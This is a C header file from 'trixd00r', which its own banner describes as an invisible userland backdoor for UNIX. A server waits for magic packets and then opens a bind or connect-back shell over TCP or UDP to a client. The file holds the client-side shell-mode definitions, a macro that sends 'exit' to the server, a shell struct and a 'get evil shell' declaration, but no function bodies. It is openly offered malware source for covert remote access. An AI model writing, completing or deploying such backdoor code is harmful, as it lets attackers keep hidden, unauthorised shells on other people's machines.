/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * client/inc/shell.h                                                          *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/


#ifndef __SHELL_H__
#define __SHELL_H__


#include "trixd00r.h"
#include "packet.h"


/* send "exit" to server (only UDP part) to trigger SIGCHLD, so that the server
 * doesn't hang around like a bitch... */
#define __SEND_EXIT if (user_exit) \
    xsendto(packet->cfd, "exit", 4, 0, (struct sockaddr *) &packet->srv, \
            packet->len);


/* default values */
#define DEF_MODE    _TCP_CONN_PORT


/* socket read()/write() buffer */
#define SOCKBUF 4096


/* available shell modes (description) */
#define TCP_CONN_PORT   "TCP connect"
#define TCP_BIND_PORT   "TCP listen"
#define UDP_CONN_PORT   "UDP connect"
#define UDP_BIND_PORT   "UDP listen"


typedef struct {
    unsigned char mode;     /* connect or listen mode, tcp or udp? */
    packet_t *packet;       /* see packet.h */
    unsigned char verbose;  /* see controller.h */
} shell_t;


/* shell modes */
enum {
    _TCP_CONN_PORT = 0, _TCP_BIND_PORT, _UDP_CONN_PORT, _UDP_BIND_PORT,
    _NUM_SHELL_MODES
};


/* print available shell modes */
void print_shell_modes();


/* get evil shell */
void get_shell(shell_t *);


#endif

/* EOF */
